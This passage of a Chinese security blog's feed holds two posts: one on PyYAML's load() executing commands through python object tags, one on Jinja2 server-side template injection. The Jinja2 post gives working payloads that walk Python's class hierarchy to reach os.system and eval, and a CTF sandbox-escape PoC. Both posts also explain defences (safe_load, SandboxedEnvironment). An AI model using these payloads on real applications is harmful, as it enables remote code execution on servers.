rel="noopener">http://andresriancho.github.io/nimbostratus/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;分布式应用中消息队列使用特别广泛，而针对分布式集群的攻击常常是点到面的扩散，突破关键点从而控制整个集群。在使用消息队列传递消息时，不安全的数据序列化方式便为整体系统埋下了一颗定时炸弹，一旦消息代理中间件被攻破就会导致整个工作节点沦陷。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（本文只
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="web" scheme="http://rickgray.me/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>PyYAML 对象类型解析导致的命令执行问题</title>
    <link href="http://rickgray.me/2016/03/09/pyyaml-tags-parse-to-command-execution/"/>
    <id>http://rickgray.me/2016/03/09/pyyaml-tags-parse-to-command-execution/</id>
    <published>2016-03-08T16:00:00.000Z</published>
    <updated>2018-04-24T15:48:57.518Z</updated>
    
    <content type="html"><![CDATA[<p>近日回顾了 PyCon 2015 上 <a href="https://twitter.com/tveastman" target="_blank" rel="noopener">@Tom Eastman</a> 所讲的关于 Python 序列化格式的安全议题 -<a href="https://www.youtube.com/watch?v=kjZHjvrAS74" target="_blank" rel="noopener">《Serialization formats are not toys》</a>。议题主要介绍了 YAML、XML 和 JSON 三种格式用于 Python 序列化数据处理所存在的一些安全问题，其中 XML 部分讲解的是 Python 中的 XXE，而 Python 处理 JSON 数据本身不存在问题，但在前端 JavaScript 对返回 JSON 进行处理时常常直接使用 <code>eval()</code> 来转换类型从而留下安全隐患。</p><p>关于 XML 和 JSON 格式相关的安全问题本文就不多提了，本文仅记录下议题中所提到的 Python PyYAML 模块在处理 YAML 格式数据时所存在的问题。</p><h3 id="一、Python-中处理-YAML-格式数据"><a href="#一、Python-中处理-YAML-格式数据" class="headerlink" title="一、Python 中处理 YAML 格式数据"></a>一、Python 中处理 YAML 格式数据</h3><p>YAML 在数据序列化和配置文件中使用比较广泛，在 Ruby On Rails 中就使用 YAML 作为配置文件。最新的 YAML 标准版本为 1.2，而目前大多数语言对 YAML 解析实现都为 1.1 甚至 1.0 版本，各版本标准可通过官方 <a href="http://www.yaml.org" target="_blank" rel="noopener">yaml.org</a> 进行查阅。一个简单的 YAML 数据为：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">date:</span> <span class="type">!!str</span> <span class="number">2016</span><span class="bullet">-03</span><span class="bullet">-09</span></span><br><span class="line"><span class="attr">weekday:</span> <span class="string">Wednesday</span></span><br><span class="line"><span class="attr">weather:</span> <span class="string">sunny</span></span><br><span class="line"><span class="attr">plans:</span> <span class="meta">&amp;plans</span></span><br><span class="line">    <span class="number">1</span><span class="string">:</span> <span class="string">daliy</span> <span class="string">resarch</span></span><br><span class="line">    <span class="number">2</span><span class="string">:</span> <span class="string">daliy</span> <span class="string">meals</span></span><br><span class="line">    <span class="number">3</span><span class="string">:</span> <span class="string">play</span> <span class="string">games</span> <span class="string">tonight</span></span><br><span class="line"><span class="attr">todo:</span></span><br><span class="line">    <span class="string">&lt;&lt;:</span> <span class="meta">*plans</span></span><br><span class="line">    <span class="number">3</span><span class="string">:</span> <span class="string">others</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure><p>保存为 <code>sample.yml</code> 然后使用 Python 第三方模块 PyYAML（pip install PyYAML) 来对其进行解析并输出：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">pprint.pprint(yaml.load(file(<span class="string">'sample.yml'</span>, <span class="string">'r'</span>)))</span><br></pre></td></tr></table></figure><p>运行代码可以得到输出：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(env)➜  python python test.py</span><br><span class="line">&#123;&apos;date&apos;: &apos;2016-03-09&apos;,</span><br><span class="line"> &apos;plans&apos;: &#123;1: &apos;daliy resarch&apos;, 2: &apos;daliy meals&apos;, 3: &apos;play games tonight&apos;&#125;,</span><br><span class="line"> &apos;todo&apos;: &#123;1: &apos;daliy resarch&apos;, 2: &apos;daliy meals&apos;, 3: &apos;others&apos;&#125;,</span><br><span class="line"> &apos;weather&apos;: &apos;sunny&apos;,</span><br><span class="line"> &apos;weekday&apos;: &apos;Wednesday&apos;&#125;</span><br></pre></td></tr></table></figure><p>PyYAML 在解析数据的时候遇到特定格式的时间数据会将其自动转化为 Python 时间对象，例如 <code>sample.yml</code> 中 <code>date</code> 节点的值使用 <code>!!str</code> 指定其在解析的时候转换为字符串，如果不使用强制类型转换，会自动将 <code>2016-09-03</code> 解析为 Python 中的 <code>datetime.date</code> 对象。如下代码和输出：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">content = <span class="string">'''---</span></span><br><span class="line"><span class="string">date: 2016-03-09</span></span><br><span class="line"><span class="string">...'''</span></span><br><span class="line">pprint.pprint(yaml.load(content))</span><br><span class="line"><span class="comment"># (env)➜  python python test1.py</span></span><br><span class="line"><span class="comment"># &#123;'date': datetime.date(2016, 3, 9)&#125;</span></span><br></pre></td></tr></table></figure><p>（本文重点不在 YAML 格式上，详情可参考官方文档和 wiki）</p><h3 id="二、PyYAML-特有类型解析-Python-对象"><a href="#二、PyYAML-特有类型解析-Python-对象" class="headerlink" title="二、PyYAML 特有类型解析 Python 对象"></a>二、PyYAML 特有类型解析 Python 对象</h3><p>除开 YAML 格式中常规的列表、字典和字符串整形等类型转化外，各个语言的 YAML 解析器或多或少都会针对其语言实现一套特殊的对象转化规则。例如 Ruby 中可以将类对象 dump 为 YAML 格式的文本数据（文件 <code>person.rb</code>）：</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'yaml'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line">  <span class="keyword">attr_accessor</span> <span class="symbol">:name</span>, <span class="symbol">:age</span>, <span class="symbol">:children</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(name, age, children=<span class="literal">nil</span>)</span></span></span><br><span class="line">    @name = name</span><br><span class="line">    @age = age</span><br><span class="line">    @children = children</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">children = [Person.new(<span class="string">'John Smith'</span>, <span class="number">12</span>), Person.new(<span class="string">'Jan Smith'</span>, <span class="number">11</span>)]</span><br><span class="line">tom = Person.new(<span class="string">'Tom Smith'</span>, <span class="number">23</span>, children)</span><br><span class="line">File.open(<span class="string">'sample2.yml'</span>, <span class="string">'w'</span>) <span class="keyword">do</span> <span class="params">|os|</span></span><br><span class="line">  YAML::dump(tom, os)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>运行脚本得到输出为（为了突入结构将其格式化，默认情况缩紧不严谨）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--- </span><br><span class="line">!ruby/object:Person</span><br><span class="line">    name: Tom Smith</span><br><span class="line">    age: 23</span><br><span class="line">    children:</span><br><span class="line">        - !ruby/object:Person</span><br><span class="line">            name: John Smith</span><br><span class="line">            age: 12</span><br><span class="line">            children:</span><br><span class="line">        - !ruby/object:Person</span><br><span class="line">            name: Jan Smith</span><br><span class="line">            age: 11</span><br><span class="line">            children:</span><br></pre></td></tr></table></figure><p>其中 <code>!ruby/object:Person</code> 指代的是 <code>person.rb</code> 中的 <code>Person</code> 类，是 Ruby 里 yaml 模块针对 Ruby 语言的特有实现，如果使用其他语言的 YAML 解析器来加载这段 YAML 文本必定会报错。不同语言针对 YAML 基本都有一套其对语言对象的解析扩展，这也是 YAML 在各语言之间兼容性差的原因之一。</p><p>而在 Python 中，一个对象序列化为 YAML 数据是这个样子的：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age, sponse=None, children=None)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.sponse = sponse</span><br><span class="line">        self.children = children</span><br><span class="line"></span><br><span class="line">jane = Person(<span class="string">'Jane Smith'</span>, <span class="number">25</span>)</span><br><span class="line">children = [Person(<span class="string">'Jimmy Smith'</span>, <span class="number">15</span>), Person(<span class="string">'Jenny Smith'</span>, <span class="number">12</span>)]</span><br><span class="line">john = Person(<span class="string">'John Smith'</span>, <span class="number">37</span>, jane, children)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> yaml.dump(john)</span><br><span class="line"><span class="keyword">print</span> yaml.dump(open(<span class="string">'sample.yml'</span>, <span class="string">'r'</span>))</span><br></pre></td></tr></table></figure><p>运行脚本输出结果为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(env)➜  python python person.py</span><br><span class="line">!!python/object:__main__.Person</span><br><span class="line">age: 37</span><br><span class="line">children:</span><br><span class="line">- !!python/object:__main__.Person &#123;age: 15, children: null, name: Jimmy Smith, sponse: null&#125;</span><br><span class="line">- !!python/object:__main__.Person &#123;age: 12, children: null, name: Jenny Smith, sponse: null&#125;</span><br><span class="line">name: John Smith</span><br><span class="line">sponse: !!python/object:__main__.Person &#123;age: 25, children: null, name: Jane Smith,</span><br><span class="line">  sponse: null&#125;</span><br><span class="line"></span><br><span class="line">!!python/object:__builtin__.file &#123;&#125;</span><br></pre></td></tr></table></figure><p>可以看到 <code>!!python/object:__main__.Person</code> 为 PyYAML 中对 Python 对象的类型转化标签，在解析时会将后面的值作为 <code>Person</code> 类的实例化参数进行对象还原。在上面的测试代码中特地 dump 了一下文件对象 <code>open(&#39;sample.yml&#39;, &#39;r&#39;)</code>，在 YAML 中对应的数据为 <code>!!python/object:__builtin__.file {}</code>，这里参数为空，其实通过 PyYAML load() 还原回去会发现是一个为初始化参数并已经处于关闭状态的畸形 file 实例对象。</p><p>然而看到 <code>__builtin__</code> 这个关键字就应该敏感起来，通过查看 PyYAML 源码可以得到其针对 Python 语言特有的标签解析的处理函数对应列表（<code>$PYTHON_HOME/lib/site-packages/yaml/constructor.py</code>612 - 674 行）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!!python/none             =&gt;  Constructor.construct_yaml_nul</span><br><span class="line">!!python/bool             =&gt;  Constructor.construct_yaml_boo</span><br><span class="line">!!python/str              =&gt;  Constructor.construct_python_str</span><br><span class="line">!!python/unicode          =&gt;  Constructor.construct_python_unicode</span><br><span class="line">!!python/int              =&gt;  Constructor.construct_yaml_int</span><br><span class="line">!!python/long             =&gt;  Constructor.construct_python_long</span><br><span class="line">!!python/float            =&gt;  Constructor.construct_yaml_float</span><br><span class="line">!!python/complex          =&gt;  Constructor.construct_python_complex</span><br><span class="line">!!python/list             =&gt;  Constructor.construct_yaml_seq</span><br><span class="line">!!python/tuple            =&gt;  Constructor.construct_python_tuple</span><br><span class="line">!!python/dict             =&gt;  Constructor.construct_yaml_map</span><br><span class="line">!!python/name:            =&gt;  Constructor.construct_python_name</span><br><span class="line">!!python/module:          =&gt;  Constructor.construct_python_module</span><br><span class="line">!!python/object:          =&gt;  Constructor.construct_python_object</span><br><span class="line">!!python/object/apply:    =&gt;  Constructor.construct_python_object_apply</span><br><span class="line">!!python/object/new:      =&gt;  Constructor.construct_python_object_new</span><br></pre></td></tr></table></figure><p>其中需要特别指出的是 <code>!!python/object/apply</code> 这个对象标签，通过该标签可以在 PyYAML 解析 YAML 数据时，动态的创建 Python 对象，关键代码如下（<code>$PYTHON_HOME/lib/site-packages/yaml/constructor.py</code> 574 - 607 行）：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">construct_python_object_apply</span><span class="params">(self, suffix, node, newobj=False)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(node, SequenceNode):</span><br><span class="line">        args = self.construct_sequence(node, deep=<span class="keyword">True</span>)</span><br><span class="line">        kwds = &#123;&#125;</span><br><span class="line">        state = &#123;&#125;</span><br><span class="line">        listitems = []</span><br><span class="line">        dictitems = &#123;&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        value = self.construct_mapping(node, deep=<span class="keyword">True</span>)</span><br><span class="line">        args = value.get(<span class="string">'args'</span>, [])</span><br><span class="line">        kwds = value.get(<span class="string">'kwds'</span>, &#123;&#125;)</span><br><span class="line">        state = value.get(<span class="string">'state'</span>, &#123;&#125;)</span><br><span class="line">        listitems = value.get(<span class="string">'listitems'</span>, [])</span><br><span class="line">        dictitems = value.get(<span class="string">'dictitems'</span>, &#123;&#125;)</span><br><span class="line">    instance = self.make_python_instance(suffix, node, args, kwds, newobj)  <span class="comment"># 使用参数实例化指定对象</span></span><br><span class="line">    <span class="keyword">if</span> state:</span><br><span class="line">        self.set_python_instance_state(instance, state)</span><br><span class="line">    <span class="keyword">if</span> listitems:</span><br><span class="line">        instance.extend(listitems)</span><br><span class="line">    <span class="keyword">if</span> dictitems:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> dictitems:</span><br><span class="line">            instance[key] = dictitems[key]</span><br><span class="line">    <span class="keyword">return</span> instance</span><br></pre></td></tr></table></figure><p>例如提供 Python 标签 <code>!!python/object/apply:time.ctime []</code>，最终在解析过程中会动态加载 time 模块然后调用 <code>ctime()</code> 函数，具体实现在 <code>make_python_instance()</code> 中，处理过程可自行查看源码，这里就不单独分析了。</p><h3 id="三、load-和-safe-load"><a href="#三、load-和-safe-load" class="headerlink" title="三、load() 和 safe_load()"></a>三、load() 和 safe_load()</h3><p>前面已经说过通过 <code>!!python/object/apply</code> 这个对象标签可以在 PyYAML 解析（反序列化）的时候构造 Python 对象实例和调用函数，既然能够调用函数了那正常情况下命令执行也是没有问题的了，示例代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">content = <span class="string">'''---</span></span><br><span class="line"><span class="string">!!python/object/apply:subprocess.check_output [[ls]]</span></span><br><span class="line"><span class="string">...'''</span></span><br><span class="line"><span class="keyword">print</span> yaml.load(content)</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="/images/articles/2016-03-09-pyyaml-tags-parse-to-command-execution/1.png" alt=""></p><p>这里只是举了一个通过 PyYAML 解析 YAML 数据来执行 <code>subprocess.check_output</code> 函数的例子，更复杂的 Payload 可以自行尝试构造。</p><p>其实这里有个很严重的问题就是 PyYAML 在解析创建 Python 对象时，并没有限制函数类型的传递：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_python_instance</span><span class="params">(self, suffix, node,</span></span></span><br><span class="line"><span class="function"><span class="params">        args=None, kwds=None, newobj=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args:</span><br><span class="line">        args = []</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> kwds:</span><br><span class="line">        kwds = &#123;&#125;</span><br><span class="line">    cls = self.find_python_name(suffix, node.start_mark)</span><br><span class="line">    <span class="keyword">if</span> newobj <span class="keyword">and</span> isinstance(cls, type(self.classobj))  \</span><br><span class="line">            <span class="keyword">and</span> <span class="keyword">not</span> args <span class="keyword">and</span> <span class="keyword">not</span> kwds:</span><br><span class="line">        instance = self.classobj()</span><br><span class="line">        instance.__class__ = cls</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line">    <span class="keyword">elif</span> newobj <span class="keyword">and</span> isinstance(cls, type):</span><br><span class="line">        <span class="keyword">return</span> cls.__new__(cls, *args, **kwds)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> cls(*args, **kwds)  <span class="comment"># 如果 cls 为函数则直接进行调用</span></span><br></pre></td></tr></table></figure><p>可以看到如果需要实例化的对象为函数类型，在最后会直接 <code>return cls(*args, **kwds)</code> 进行函数调用（cls 此时为 function），从而导致通过该特性可以直接调用一些危险函数。</p><p>PyYAML 的 <code>load()</code> 函数为非安全的解析方法，可以解析其针对 Python 对象实现的扩展标签。但是为了防止一些情况下 YAML 数据受到控制，可以使用 <code>safe_load()</code> 函数来进行安全解析，在 <code>SafeLoader</code> 中去掉了对 Python 对象标签的支持，可以防止恶意数据造成的命令执行等问题。</p><h3 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h3><p>虽然 YAML 一般不会做为用户可控的数据传递给服务器解析，但是针对 PyYAML 这种存在隐患的解析方式，应该采取默认安全解析的方式，也就是使用 <code>safe_load()</code> 作为默认的数据解析方法来禁止特有对象标签的解析。这样虽然去掉了针对 Python 对象的支持，但是一定程度上确保了安全。</p><p>（不能为了便利而舍弃了安全，两者应该做到一种平衡，而不是过度倾向于某一边。）</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://en.wikipedia.org/wiki/YAML" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/YAML</a></li><li><a href="https://www.youtube.com/watch?v=kjZHjvrAS74" target="_blank" rel="noopener">https://www.youtube.com/watch?v=kjZHjvrAS74</a></li><li><a href="http://www.yaml.org/" target="_blank" rel="noopener">http://www.yaml.org/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;近日回顾了 PyCon 2015 上 &lt;a href=&quot;https://twitter.com/tveastman&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;@Tom Eastman&lt;/a&gt; 所讲的关于 Python 序列化格式的安全议题 -&lt;a hr
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="web" scheme="http://rickgray.me/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>利用 Python 特性在 Jinja2 模板中执行任意代码</title>
    <link href="http://rickgray.me/2016/02/24/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/"/>
    <id>http://rickgray.me/2016/02/24/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/</id>
    <published>2016-02-23T16:00:00.000Z</published>
    <updated>2018-04-24T17:57:44.466Z</updated>
    
    <content type="html"><![CDATA[<p>本文源于老外 <a href="https://twitter.com/nvisium" target="_blank" rel="noopener">@nvisium</a> 在其博客发表的博文 <a href="https://nvisium.com/blog/2015/12/07/injecting-flask/" target="_blank" rel="noopener">《Injecting Flask》</a>，在原文中作者讲解了 Python 模板引擎 <a href="http://jinja.pocoo.org/" target="_blank" rel="noopener">Jinja2</a> 在服务端模板注入 (SSTI) 中的具体利用方法，在能够控制模板内容时利用环境变量中已注册的用户自定义函数进行恶意调用或利用渲染进行 XSS 等。</p><p>对于 Jinja2 模板引擎是否能够在 SSTI 的情况下直接执行命令原文并没有做出说明，并且在 Jinja2 官方文档中也有说明，模板中并不能够直接执行任意 Python 代码，这样看来在 Jinja2 中直接控制模板内容来执行 Python 代码或者命令似乎不太可能。</p><h3 id="一、模板中复杂的代码执行方式"><a href="#一、模板中复杂的代码执行方式" class="headerlink" title="一、模板中复杂的代码执行方式"></a>一、模板中复杂的代码执行方式</h3><p>最近在进行项目开发时无意中注意到 Jinja2 模板中可以访问一些 Python 内置变量，如 <code>[]</code> <code>{}</code> 等，并且能够使用 Python 变量类型中的一些函数，示例代码一如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">template = Template(<span class="string">"Your input: &#123;&#125;"</span>.format(sys.argv[<span class="number">1</span>] <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">'&lt;empty&gt;'</span>))</span><br><span class="line"><span class="keyword">print</span> template.render()</span><br></pre></td></tr></table></figure><p>为了方便演示，这里直接将命令参数输入拼接为模板内容的一部分并进行渲染输出，这里我们直接输入 <code>abcd</code> 使模板直接渲染字符串变量：</p><p><img src="/images/articles/2016-02-24-use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/1.png" alt=""></p><p>当然上面说了可以在模板中直接调用变量实例的函数，如字符串变量中的 <code>upper()</code> 函数将其字符串转换为全大写形式：</p><p><img src="/images/articles/2016-02-24-use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/2.png" alt=""></p><p>那么如何在 Jinja2 的模板中执行 Python 代码呢？如官方的说法是需要在模板环境中注册函数才能在模板中进行调用，例如想要在模板中直接调用内置模块 <code>os</code>，即需要在模板环境中对其注册，示例代码二如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">template = Template(<span class="string">"Your input: &#123;&#125;"</span>.format(sys.argv[<span class="number">1</span>] <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">'&lt;empty&gt;'</span>))</span><br><span class="line">template.globals[<span class="string">'os'</span>] = os</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> template.render()</span><br></pre></td></tr></table></figure><p>执行代码，并传入参数 <code>{{ os.popen('echo Hello RCE').read() }}</code>，因为在模板环境中已经注册了 <code>os</code> 变量为 Python <code>os</code> 模块，所以可以直接调用模块函数来执行系统命令，这里执行额系统命令为 <code>echo Hello Command Exection</code>：</p><p><img src="/images/articles/2016-02-24-use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/3.png" alt=""></p><p>如果使用示例代码一来执行，会得到 <code>os</code> 未定义的异常错误：</p><p><img src="/images/articles/2016-02-24-use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/4.png" alt=""></p><h3 id="二、利用-Python-特性直接执行任意代码"><a href="#二、利用-Python-特性直接执行任意代码" class="headerlink" title="二、利用 Python 特性直接执行任意代码"></a>二、利用 Python 特性直接执行任意代码</h3><p>那么，如何在未注册 <code>os</code> 模块的情况下在模板中调用 <code>popen()</code> 函数执行系统命令呢？前面已经说了，在 Jinja2 中模板能够访问 Python 中的内置变量并且可以调用对应变量类型下的方法，这一特点让我联想到了常见的 Python 沙盒环境逃逸方法，如 2014CSAW-CTF 中的一道 Python 沙盒绕过题目，环境代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Welcome to my Python sandbox! Enter commands below!"</span>)</span><br><span class="line"></span><br><span class="line">banned = [  </span><br><span class="line">    <span class="string">"import"</span>,</span><br><span class="line">    <span class="string">"exec"</span>,</span><br><span class="line">    <span class="string">"eval"</span>,</span><br><span class="line">    <span class="string">"pickle"</span>,</span><br><span class="line">    <span class="string">"os"</span>,</span><br><span class="line">    <span class="string">"subprocess"</span>,</span><br><span class="line">    <span class="string">"kevin sucks"</span>,</span><br><span class="line">    <span class="string">"input"</span>,</span><br><span class="line">    <span class="string">"banned"</span>,</span><br><span class="line">    <span class="string">"cry sum more"</span>,</span><br><span class="line">    <span class="string">"sys"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">targets = __builtins__.__dict__.keys()  </span><br><span class="line">targets.remove(<span class="string">'raw_input'</span>)  </span><br><span class="line">targets.remove(<span class="string">'print'</span>)  </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:  </span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:  </span><br><span class="line">    print(<span class="string">"&gt;&gt;&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">    data = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            print(<span class="string">"No bueno"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># this means nobreak</span></span><br><span class="line">        <span class="keyword">exec</span> data</span><br></pre></td></tr></table></figure><p>（利用 Python 特性绕过沙盒限制的详细讲解请参考 <a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/" target="_blank" rel="noopener">Writeup</a>），这里给出笔者改进后的 PoC：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[c <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'echo Hello SandBox'</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/articles/2016-02-24-use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/5.png" alt=""></p><p>当然通过这种方式不仅仅能够通过 <code>os</code> 模块来执行系统命令，还能进行文件读写等操作，具体的代码请自行构造。</p><p>回到如何在 Jinja2 模板中直接执行代码的问题上，因为模板中能够访问 Python 内置的变量和变量方法，并且还能通过 Jinja2 的模板语法去遍历变量，因此可以构造出如下模板 Payload 来达到和上面 PoC 一样的效果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">&#123;&#123; c.__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;id&apos;) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">使用该 Payload 作为示例代码二的执行参数，最终会执行系统命令 `id`：</span><br><span class="line"></span><br><span class="line">![](/images/articles/2016-02-24-use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/6.png)</span><br><span class="line"></span><br><span class="line">当然除了遍历找到 `os` 模块外，还能直接找回 `eval` 函数并进行调用，这样就能够调用复杂的 Python 代码。</span><br><span class="line"></span><br><span class="line">原始的 Python PoC 代码如下：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">[a for a in [b for b in [c for c in [].__class__.__base__.__subclasses__() if c.__name__ == &apos;catch_warnings&apos;][0].__init__.func_globals.values() if type(b) == dict] if &apos;eval&apos; in a.keys()][0][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&apos;)</span><br></pre></td></tr></table></figure><p>在 Jinja2 中模板 Payload 如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.func_globals.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;eval&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><code>`</code></p><p>使用该 Payload 作为示例代码二的执行参数（注意引号转义），成功执行会使用 <code>eval()</code> 函数动态载入 <code>os</code> 模块并执行命令：</p><p><img src="/images/articles/2016-02-24-use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/7.png" alt=""></p><h3 id="三、利用途径和防御方法"><a href="#三、利用途径和防御方法" class="headerlink" title="三、利用途径和防御方法"></a>三、利用途径和防御方法</h3><p>SSTI（服务端模板注入）。通过 SSTI 控制 Web 应用渲染模板（基于 Jinja2）内容，可以轻易的进行远程代码（命令）执行。当然了，一切的前提都是模板内容可控，虽然这种场景并不常见，但难免会有程序员疏忽会有特殊的需求会让用户控制模板的一些内容。</p><p>在 Jinja2 模板中防止利用 Python 特性执行任意代码，可以使用 Jinja2 自带的沙盒环境 <code>jinja2.sandbox.SandboxedEnvironment</code>，Jinja2 默认沙盒环境在解析模板内容时会检查所操作的变量属性，对于未注册的变量属性访问都会抛出错误。</p><p><img src="/images/articles/2016-02-24-use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/8.png" alt=""></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></li><li><a 